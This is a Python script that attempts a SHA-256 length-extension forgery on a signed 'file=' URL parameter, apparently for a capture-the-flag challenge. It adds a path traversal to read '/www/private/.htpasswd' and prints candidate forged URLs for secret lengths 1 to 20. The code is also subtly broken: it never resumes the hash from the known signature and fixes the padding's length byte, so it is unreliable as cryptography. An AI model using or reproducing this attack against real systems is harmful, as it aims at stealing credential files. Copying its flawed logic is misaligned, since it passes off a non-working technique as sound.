#!/usr/bin/python
import base64
import hashlib

def Calculate(BaseURL, Appended, SecretLength, TargetLength):
    # Set return bool to True to keep looping.
    retBool = True
    # Set each character to number of bits.
    CB = 8
    # Padding must start with %80 and end with %A8.
    padPre = "%80"
    padPost = "%A8"
    # Padding length is 8 bits.
    lPR = 8
    lPP = 8
    # Get the needed padding for the middle.
    padMiddle = GetPadMiddle(SecretLength * CB, len(BaseURL) * CB, lPR, lPP, TargetLength)
    # Build the new URL
    URL = BaseURL + padPre + padMiddle + padPost + Appended
    b64url = base64.b64encode(URL)
    sigurl = hashlib.sha256(b64url).hexdigest()
    b64sig = base64.b64encode(sigurl)

    #print("Sec Bit :  " + str(SecretLength * 8))
    #print("BUR    :  " + BaseURL)
    #print("B64 URL:  " + b64url)
    #print("B64 SIG:  " + b64sig)
    #print("Len Start:  " + str(utf8len(BaseURL) + (SecretLength * 8)))
    print("URL:  " + URL)
    print(b64url + " " + b64sig + "\n")
    return  retBool

def main():
    #file=/www/new-agents/roster.txt
    #sig=BE3663BE6AF17EF57B2671E7C73069076151A5F72923E85CC5E34CD68A443E2D
    #Desired file: /www/private/.htpasswd
    # Target Length is in bits.
    TargetLength = 512
    # Secret Length is in Bytes.
    SecretMinLen = 1
    SecretMaxLen = 20

    # Base URL is the original URL.
    BaseURL = "file=/www/new-agents/roster.txt"
    # Appended URL is the new URL.
    Appended = "/../www/private/.htpasswd&"

    # Set loop counter to 0.
    LC = 0

    # Set Keep Looping bool.
    KL = True

    # Loop through all possible combinations.
    while (KL):
        LC += 1
        KL = Calculate(BaseURL, Appended, LC, TargetLength)

        if (LC >= SecretMaxLen):
            KL = False
        else:
            KL = True

def utf8len(s):
    return len(s) * 8

def GetPadMiddle(SecretLength, BaseURL, padPre, padPost, TargetLength):
    retString = ""
    #print("Bit Len Secret:  " + str(SecretLength))
    #print("Bit Len Base  :  " + str(BaseURL))
    #print("Bit Len Pad St:  " + str(padPre))
    #print("Bit Len Pad En:  " + str(padPost))
    #print("Bit Len Max Ln:  " + str(TargetLength))
    #print("Bit Len -B    :  " + str(TargetLength - BaseURL))
    #print("Bit Len -PP   :  " + str(TargetLength - BaseURL - padPre))
    #print("Bit Len -PO   :  " + str(TargetLength - BaseURL - padPre - padPost))

    NeededPadding = (TargetLength - (SecretLength + BaseURL + padPre + padPost))
    #print("Bit Len Pad Nd:  " + str(NeededPadding))

    LC = 0
    for i in range(0, NeededPadding / 8):
        LC += 1
        retString += "%00"
    #print("Padded Chars:  " + str(LC))
    return retString

if __name__ == "__main__":
    main()